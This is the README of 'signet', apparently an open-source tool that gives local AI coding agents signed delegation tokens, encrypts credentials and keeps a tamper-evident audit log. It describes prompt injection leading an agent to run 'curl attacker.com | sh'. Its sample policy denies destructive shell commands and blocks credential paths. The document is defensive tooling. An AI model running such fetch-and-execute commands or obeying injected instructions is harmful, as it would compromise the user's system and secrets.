# signet

**"Your agent doesn't need your keys. It needs a keyhole."**

[![CI](https://github.com/kodandy/signet/actions/workflows/test.yml/badge.svg)](https://github.com/kodandy/signet/actions/workflows/test.yml)
[![Node](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](package.json)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

Cryptographic authorization delegation layer for local AI agents.
Lightweight implementation of [South et al. "Authenticated Delegation and Authorized AI Agents" (MIT, 2025)](https://arxiv.org/abs/2501.09674).

<p align="center">
  <img src="demo/signet-demo.gif" alt="signet demo" width="720">
</p>

---

## Why signet

Local AI agents (Claude Code, Cursor, and friends) run with **your** full user privileges: your `.env`, your `~/.ssh`, your `~/.aws`, your shell. A single prompt injection — a malicious README, a poisoned issue comment, a compromised dependency — can turn a helpful agent into `curl attacker.com | sh` running as you.

Sandboxes contain the blast radius. Policy engines decide yes/no. But neither answers the questions that matter after something goes wrong:

- **Who** authorized this action, and **when**?
- Was this decision **actually made** by the policy, or forged?
- Has the log been **tampered with**?

signet answers these cryptographically. Each agent gets its own Ed25519 keypair. You issue signed delegation tokens defining what each agent may do, for how long, and how many times. Every request is signed by the agent; every decision is signed by you (or your policy); every log entry is hash-chained. The result is **non-repudiation for AI agent actions** — a property sandboxes and policy engines don't provide.

## What this does

AI agents get their own Ed25519 keypair.
You issue signed delegation tokens defining what each agent can do.
Every action request is signed, every approval is signed.
Tamper-evident audit trail.

**Not a sandbox. Not a policy engine. A cryptographic trust layer.**

```
┌──────────────────────────────────────────┐
│  You (Ed25519 keypair)                   │
└──────────┬───────────────────────────────┘
           │ signs Delegation Token
           ▼
┌──────────────────────────────────────────┐
│  Delegation Token (signed JSON)          │
│  scope: fs, network, shell, credentials  │
│  expires: 4h │ max_uses: 10             │
└──────────┬───────────────────────────────┘
           │
           ▼
┌──────────────────────────────────────────┐
│  signet engine                           │
│  Policy ── Credential Vault ── Audit Log │
└──────────┬───────────────────────────────┘
           │ intercepts
           ▼
┌──────────────────────────────────────────┐
│  AI Agent (session-scoped Ed25519 key)   │
│  signs every request → gets signed reply │
└──────────────────────────────────────────┘
```

## Quick Start

> **Note**: not yet published to npm — install from source for now.

```bash
git clone https://github.com/kodandy/signet.git
cd signet
npm install
npm run build
npm link            # makes the `signet` CLI available globally

# Try the interactive demo (no project setup needed)
signet demo
```

Then, inside the project you want to protect:

```bash
# Initialize with auto-detection (reads package.json, .env, git remote, etc.)
signet init --smart

# Edit policy
vim signet.yml

# Dry-run check
signet check "git push origin main"
# ❓ shell: "git push origin main" → ask

signet check "npm test"
# ➖ shell: "npm test" → no_match

# Activate vault protection
signet activate

# View audit log
signet log

# Verify chain integrity
signet log --verify
```

## Policy (signet.yml)

```yaml
version: 1
defaults:
  expires: "4h"

scope:
  filesystem:
    writable:
      - "./src/**"
      - "./test/**"
    readable:
      - "./**"
    blocked:
      - "./.env"
      - "~/.ssh/**"
      - "~/.aws/**"

  network:
    allow:
      - "github.com"
      - "registry.npmjs.org"
    deny:
      - "*"

  shell:
    deny:
      - "rm -rf *"
      - "sudo *"
    ask:
      - "git push *"
      - "npm publish *"

  credentials:
    github_token:
      source: "env:GITHUB_TOKEN"
      allowed_actions:
        - "git push"
        - "gh pr create"
      max_uses: 10
      require_approval: false
```

Templates available: `--template node`, `--template python`, `--template general`

## CLI

```
Core
  signet init [--smart] [--template <name>] [--claude-code]
                                                     Setup keys + policy
  signet activate                                    Enable vault + policies
  signet deactivate [--force]                        Restore credentials
  signet status                                      Show current state
  signet scan [--fix]                                Find exposed credentials
  signet demo                                        Interactive walkthrough

Policy & Checking
  signet check "<target>" [--type shell|fs_*|network|credential]
                                                     Dry-run policy check
  signet log [--verify] [--export json|csv] [-n N]   Audit log

Key Management
  signet keys list                                   List agent keys
  signet keys generate <name>                        Generate agent keypair
  signet keys register <name> <pubkey>               Register agent public key

Delegation & Tokens
  signet delegate <pubkey> [--expires 4h] [--max-uses N] [-o file]
                                                     Issue delegation token
  signet tokens list                                 List issued tokens
  signet revoke <signature> [--reason "..."]         Revoke a token
  signet revoked                                     List revoked tokens

Adapters
  signet adapt claude-code                           Generate .claude/settings.json
  signet adapt cursor                                Generate .cursor/rules + .cursorignore
  signet adapt generic                               Generate PATH wrapper scripts
```

## How it works

### Decision flow

```
ActionRequest received
  → Verify agent signature (Ed25519)
  → Validate DelegationToken (expired? revoked? nonce replayed? max_uses exceeded?)
  → Policy matching:
    → blocked/deny → reject (signed)
    → allow → approve (signed)
    → ask → prompt user → decision (signed)
  → Log to audit trail (chain-hashed)
```

### Audit chain

Every log entry includes a SHA-256 hash of the previous entry, creating a tamper-evident chain. If any entry is modified, inserted, or deleted, `signet log --verify` detects it.

### Credential vault

On `signet activate`:
1. `.env` files are encrypted with AES-256-GCM and moved to `~/.signet/vault/`
2. Credential env vars are cleared from the process
3. Agents cannot access credentials directly
4. Approved credential use is temporarily injected per-command

## Security model

### What signet provides

- **Credential isolation**: secrets at rest are AES-256-GCM encrypted; agents never see raw values — approved uses are injected per-command and scoped by `allowed_actions` / `max_uses`
- **Non-repudiation**: every `ActionRequest` is signed with the agent's key, every `ActionDecision` with yours; neither side can forge or deny an interaction
- **Replay protection**: requests carry a nonce; delegation tokens carry expiry, usage limits, and revocation
- **Tamper-evident history**: the audit log is hash-chained and independently verifiable

### Attack classes covered by tests

The adversarial test suite (`test/security-edge-cases.test.ts`) exercises, among others: signature truncation, null-byte injection, self-signed delegation attempts, ciphertext (GCM) tampering, legacy-CBC downgrade rejection, nonce replay, expired / over-used delegations, ReDoS resistance in policy matching, audit-chain canonicalization ambiguities, and decision-signature integrity.

### Non-goals & limitations

Be honest about what a trust layer is not:

- **Not an OS sandbox.** Enforcement is cooperative (PATH wrappers, editor settings). An agent with unrestricted shell access could bypass wrappers — pair signet with OS-level sandboxing (containers, macOS Seatbelt) when you need containment. signet's contribution is *accountability*, not *confinement*.
- **Local, single-user trust model.** Your keypair is the root of trust; there is no remote IdP or OIDC federation.
- **A compromised host is out of scope.** If the attacker already owns your user account, no local tool saves you.

## Editor integrations

### Claude Code

```bash
signet init --claude-code
```

Generates:
- `.claude/settings.json` with deny/ask rules matching your policy
- `CLAUDE.md` section with security policy documentation

### Cursor

```bash
signet adapt cursor
```

Generates:
- `.cursor/rules/signet-policy.mdc` — policy rules
- `.cursorignore` — blocked paths

## Architecture

```
src/
  crypto/         Ed25519 keypair management + delegation tokens
  policy/         YAML parser + glob/pattern matching
  engine/         Core evaluation loop
  vault/          Credential isolation (.env evacuation, AES-256-GCM)
  audit/          SQLite logger with chain hashing
  adapters/       Claude Code, Cursor, generic (PATH wrapper)
  index.ts        CLI entry point
templates/        Preset policy files (node, python, general)
```

| Module | Purpose |
|--------|---------|
| `crypto/keys.ts` | Ed25519 keypair gen/save/load, sign/verify |
| `crypto/delegation.ts` | Delegation token create/verify |
| `policy/parser.ts` | YAML → validated Scope |
| `policy/matcher.ts` | Glob matching for fs, network, shell, credentials |
| `engine/evaluator.ts` | ActionRequest → signed ActionDecision |
| `audit/logger.ts` | SQLite + chain hash, export, verify |
| `vault/manager.ts` | .env evacuation, temp credential injection |
| `adapters/*.ts` | Claude Code / Cursor / generic PATH wrappers |

## Testing

**307 tests across 17 suites**, run on Node 20 and 22 in CI — including 23 adversarial security edge-case tests (see [Security model](#security-model)) and full coverage of crypto, policy matching, the evaluation engine, the vault, the audit chain, and every adapter.

```bash
npm test
```

## Differentiation

|  | Sandbox | Cerbos/Permit.io | 1Password | **signet** |
|--|---------|-------------------|-----------|------------|
| Approach | Containment | Policy engine | Key vault | **Crypto delegation** |
| Target | Single agent | Enterprise | Browser | **Local dev** |
| Setup | Config | Docker+IdP | SaaS | **`signet init`** |
| Signatures | None | None | Partial | **All operations** |
| Non-repudiation | No | No | No | **Yes** |
| Multi-agent | No | Yes | No | **Planned** |

## Tech Stack

- **Runtime**: Node.js ≥18 / Bun
- **Crypto**: [tweetnacl](https://github.com/dchest/tweetnacl-js) (Ed25519) + Node `crypto` (AES-256-GCM)
- **Storage**: [better-sqlite3](https://github.com/WiseLibs/better-sqlite3) (audit logs)
- **CLI**: [Commander.js](https://github.com/tj/commander.js)
- **Policy**: YAML ([yaml](https://github.com/eemeli/yaml))

## Academic Foundation

Based on **South, T. et al. "Authenticated Delegation and Authorized AI Agents" (2025)** [arXiv:2501.09674](https://arxiv.org/abs/2501.09674)

> Extends OAuth 2.0 / OpenID Connect for agent delegation with a 3-layer token structure:
> User ID + Agent ID + Delegation Token.

We simplify for local use:
- OIDC server → local Ed25519 keypairs
- JWT → lightweight signed JSON
- IdP federation → not needed (local only)

## Development

```bash
git clone https://github.com/kodandy/signet.git
cd signet
npm install
npm run build       # esbuild → dist/
npm test            # vitest, 307 tests
```

## Roadmap

- [x] Core: crypto, policy, engine, audit
- [x] UX: CLI, vault, adapters, templates
- [x] Cursor adapter
- [ ] npm publication (`ai-signet`)
- [ ] LLM-based natural language → structured permission auto-generation
- [ ] OpenClaw adapter
- [ ] Slack/webhook approval flow
- [ ] W3C DID/VC integration (multi-agent)

## License

MIT
